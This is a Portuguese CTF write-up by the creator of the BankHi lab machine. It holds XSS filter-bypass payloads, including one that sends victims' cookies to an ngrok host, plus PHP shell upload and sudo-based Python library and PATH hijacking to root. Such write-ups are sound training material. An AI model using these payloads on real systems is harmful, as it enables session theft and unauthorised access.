---
layout: post
title:  "UHCCTF (Classificatória) - BankHi (Official Write-Up)"
tags: pt-br ctf write-up
---

<script async src="https://www.googletagmanager.com/gtag/js?id=G-72MZ89K41P"></script>
<script>
  window.dataLayer = window.dataLayer || [];
  function gtag(){dataLayer.push(arguments);}
  gtag('js', new Date());

  gtag('config', 'G-72MZ89K41P');
</script>

Essa foi a primeira máquina que eu criei e ela é muito especial para mim, espero que gostem 🙂

Ela foi feita pensando na exploração de técnicas de Hijacking. 

```
easter egg → bank name = Hi          
name of background image = jack.jpg
team developer name = jack
HiJack - Hijacking :) 
```

# Recon

![/assets/bankhi/Untitled.png](/assets/bankhi/Untitled.png)

A página principal parece ser de um banco normal, dando uma lida percebemos que existe uma sessão sobre o time do banco:

![/assets/bankhi/Untitled%201.png](/assets/bankhi/Untitled%201.png)

Ok, já sabemos o nome de possíveis usuários administradores!

Dando mais uma navegada podemos encontrar uma página um tanto quanto interessante:

![/assets/bankhi/Untitled%202.png](/assets/bankhi/Untitled%202.png)

Parece que o Banco tem um programa próprio de Bug Bounty (recompensa por bugs).

Mesmo assim vamos fazer um fuzzing no site.

```bash
ffuf -w /usr/share/seclists/Discovery/Web-Content/big.txt -u 'https://bankhi.uhclabs.com/FUZZ' -c
```

![/assets/bankhi/Untitled%203.png](/assets/bankhi/Untitled%203.png)

É, nada de interessante, todas essas pastas com status 301 estão com acesso negado 😢.

Vamos ver esse tal programa de BugBounty e fazer um fuzzing nele:

```bash
ffuf -w /usr/share/seclists/Discovery/Web-Content/big.txt -u 'https://bankhi.uhclabs.com/bugbounty/FUZZ' -c
```

![/assets/bankhi/Untitled%204.png](/assets/bankhi/Untitled%204.png)

Só retornou um diretório de uploads, mas não existe directory listening. Talvez se usássemos outra wordlist eu teria pego index.php, login.php, report.php...

Temos de cara uma página de login e um link para criar usuários. (login.php)

![/assets/bankhi/Untitled%205.png](/assets/bankhi/Untitled%205.png)

Os três botões ali em cima eu preciso estar autenticado para usar, depois de testar algumas credenciais padrão e não ter sucesso vamos criar um user!

Depois de criar um user e logar, temos acesso ao index.php

![/assets/bankhi/Untitled%206.png](/assets/bankhi/Untitled%206.png)

Dando uma olhada no source code... Temos nossa primeira flag.

![/assets/bankhi/Untitled%207.png](/assets/bankhi/Untitled%207.png)

Parece ser uma página de reports. É importante ressaltar que os admins podem ver nossos reports 🤔.

Vamos fazer um report:

![/assets/bankhi/Untitled%208.png](/assets/bankhi/Untitled%208.png)

![/assets/bankhi/Untitled%209.png](/assets/bankhi/Untitled%209.png)

Agora vamos ver como ele se faz no código html:

```html

<h5 class='card-title'>test</h5>
<h6 class='card-subtitle mb-2 text-muted; text-warning'>Open</h6>
<p class='card-text text-info'>From: vinicius</p>
<p class='card-text'>test</p>
```

# Exploitation

Ok, vamos testar um XSS aqui, não é muito comum em CTFs mas se os admins realmente verem nossos reports provavelmente poderemos executar scripts maliciosos na página deles.

```jsx
<script> alert('xss') </script>
```

Vou usar o clássico dos clássicos

![/assets/bankhi/Untitled%2010.png](/assets/bankhi/Untitled%2010.png)

![/assets/bankhi/Untitled%2011.png](/assets/bankhi/Untitled%2011.png)

Interessante... Parece que a aplicação removeu nosso script e nosso alert (muito comum os sites bloquearem o alert...) Parece que teremos que fazer um bypass disso, normalmente podemos inserir uma palavra proibida dentro de outra, assim quando a aplicação remover a palavra proibida, vai concatenar a nossa palavra.

![/assets/bankhi/Untitled%2012.png](/assets/bankhi/Untitled%2012.png)

Nossa payload:

```jsx
<scrscriptipt> alealertrt('xss') </scrscriptipt>
```

Vamos enviar e ver se da certo.

![/assets/bankhi/Untitled%2013.png](/assets/bankhi/Untitled%2013.png)

Bom parece que o site está vulnerável a XSS storage, vamos pesquisar o que podemos fazer com isso... Hm, Session Hijacking, podemos roubar cookies dos usuários que verem nosso report (admins ?).

![/assets/bankhi/Untitled%2014.png](/assets/bankhi/Untitled%2014.png)

Temos um cookie de um token JWT com nosso usuário. Vamos desencodar.

![/assets/bankhi/Untitled%2015.png](/assets/bankhi/Untitled%2015.png)

Uid significa UserId, normalmente usado para dizer os privilégios de cada usuário. Como não temos a chave do token não podemos alterar esse valor. Porém sabemos que cada usuário tem um token e com esse token poderiamos roubar a sessão do usuário (Session Hijacking).

## Session Hijacking

Vamos procurar alguma payload, vou usar essa: 

```jsx
<scrscriptipt>
new Image().src='2.tcp.ngrok.io:17224/'+(document.cookie);
</scscriptript>
```

Isso vai fazer com que o browser faça uma requisição para meu IP do ngrok + a porta do ngrok  com os cookies da sessão do usuário que estiver acessando a página.

Vamos enviar e abrir nosso netcat para receber o request.

Não funcionou

```jsx
new Image().src='http://2.tcp.ngrok.io:17224/'+(.);
```

Se analisarmos a aplicação retirou a palavra "document" e a palavra "cookie", logo vamos fazer a mesma coisa que fizemos com script e está feito nosso bypass.

```jsx
<scrscriptipt>
new Image().src='http://2.tcp.ngrok.io:18238/'+(docdocumentument.cookcookieie);
</scscriptript>
```

![/assets/bankhi/Untitled%2016.png](/assets/bankhi/Untitled%2016.png)

Agora vamos usar esse token que pegamos: (se botarmos esse token no [jwt.io](http://jwt.io) ele vai mostrar o uid:1)

![/assets/bankhi/Untitled%2017.png](/assets/bankhi/Untitled%2017.png)

Mais uma Flag! Session Hijacking feito com Sucesso.

Agora temos um formulário de upload.

Pelo jeito podemos fazer o upload de php, vamos upar uma shell...

Agora vamos ver aquele diretório que o ffuf apontou o /uploads, se nossa shell está lá.

![/assets/bankhi/Untitled%2018.png](/assets/bankhi/Untitled%2018.png)

Como estou escrevendo esse write-up no dia do UHC temos um load-balancer rodando, por isso vamos dar f5 algumas vezes...

![/assets/bankhi/Untitled%2019.png](/assets/bankhi/Untitled%2019.png)

Habemos Shell !

# Pós-Exploitation

## Part 1

Agora que temos shell vou transforma-la numa shell mais responsiva para trabalharmos melhor...

![/assets/bankhi/Untitled%2020.png](/assets/bankhi/Untitled%2020.png)

```
Full tty shell
in your shell~ python3 -c 'import pty; pty.spawn("/bin/bash")'
CTRL + Z
in your terminal~ stty raw -echo; fg
ENTER
in your shell~ export TERM=xterm
```

Agora poderemos trabalhar melhor, vamos começar dando uma olhada na máquina, parece que temos dois users, um chamado ronald e outro leia (estamos como o user do apache www-data), e no / temos um arquivo chamado welcome.txt

![/assets/bankhi/Untitled%2021.png](/assets/bankhi/Untitled%2021.png)

Parece a senha do ronald, agora vamos logar como ronald, e logo na home dele temos mais uma flag!

![/assets/bankhi/Untitled%2022.png](/assets/bankhi/Untitled%2022.png)

Ok, pelo o que parece teremos que fazer uma escalação de privilégios horizontal e pegar o user da leia.

Poderíamos rodar um linpeas para enumerar, mas logo no "sudo -l" já temos algo interessante:

![/assets/bankhi/Untitled%2023.png](/assets/bankhi/Untitled%2023.png)

Isso significa que com o user ronald podemos rodar /usr/bin/python3.7 /opt/bingo.py setando uma variável de ambiente sem usar senha como o user leia.

Isso está com cara de Python Lib Hijacking

Vamos então ler esse script [bingo.py](http://bingo.py)...

### Python Lib Hijacking

[Linux Privilege Escalation](https://book.hacktricks.xyz/linux-unix/privilege-escalation)

![/assets/bankhi/Untitled%2024.png](/assets/bankhi/Untitled%2024.png)

O básico de Python LIb Hijacking é sobre escrever uma das bibliotecas importadas no script, no caso vamos usar a socketserver...

Criei uma pasta oculta no /tmp para nao leakar o exploit no meio do campeonato...

![/assets/bankhi/Untitled%2025.png](/assets/bankhi/Untitled%2025.png)

Escrevi um script com uma função chamando uma shell interativa, assim quando rodarmos o [bingo.py](http://bingo.py) como a leia, o bingo.py importará a nossa lib fake chamando uma shell como a leia. Mas como fazemos o python entender que é para usar a nossa lib? O SETENV no /etc/sudoers significa que podemos dizer o valor de alguma variável de ambiente do linux, e existe uma variável de ambiente que diz onde ficam os arquivos do python incluindo as libs, então temos só que dizer que esse diretório é o nosso /tmp/.a/ .

![/assets/bankhi/Untitled%2026.png](/assets/bankhi/Untitled%2026.png)

Gooooood

Agora como a leia podemos ver que a próxima flag estava na home dela.

![/assets/bankhi/Untitled%2027.png](/assets/bankhi/Untitled%2027.png)

## Part 2 - Root

Poderia ter rodado o linpeas mas novamente o "sudo -l" nos disse algo:

![/assets/bankhi/Untitled%2028.png](/assets/bankhi/Untitled%2028.png)

Isso significa que o user leia pode rodar /bin/sl como root sem senha e setando uma variável de ambiente...

Vamos ver esse sl.

### Path Hijacking

![/assets/bankhi/Untitled%2029.png](/assets/bankhi/Untitled%2029.png)

LOL, Aparentemente ele faz um trem no terminal.

Mas logo quando ele termina de passar o trem ele mostra um output um tanto quanto conhecido

![/assets/bankhi/Untitled%2030.png](/assets/bankhi/Untitled%2030.png)

Parece que ele está rodando um ls...

Tudo indica que seja Path Hijacking, vou rodar o strace no sl para ver as chamadas de sistema para confirmar...

![/assets/bankhi/unknown.png](/assets/bankhi/unknown.png)

É ele está chamando o "ls" direto sem path, ou seja podemos manipular a variável PATH usando nosso SETENV, PATH é a variável que determina onde os arquivos executáveis do linux estão. Por exemplo para não digitar "/usr/bin/sudo" meu PATH terá "/usr/bin/" assim quando eu for rodar o comando "sudo" eu só preciso digitar "sudo".

Então temos que criar um ls malicioso...

Usei o mesmo path que usamos para o python lib hijacking.

![/assets/bankhi/Untitled%2031.png](/assets/bankhi/Untitled%2031.png)

Escrevi um bash para apenas rodar um /bin/bash e chamar a shell interativa como root

Agora o root...

![/assets/bankhi/Untitled%2032.png](/assets/bankhi/Untitled%2032.png)

E nossa flag de root merecida!

![/assets/bankhi/Untitled%2033.png](/assets/bankhi/Untitled%2033.png)

É isso.

Essa foi a primeira maquina que eu fiz então espero que quem tenha jogado tenha gostado e sim eu sou fã de star wars, tem varios easter eggs espalhados na máquina kkskksks...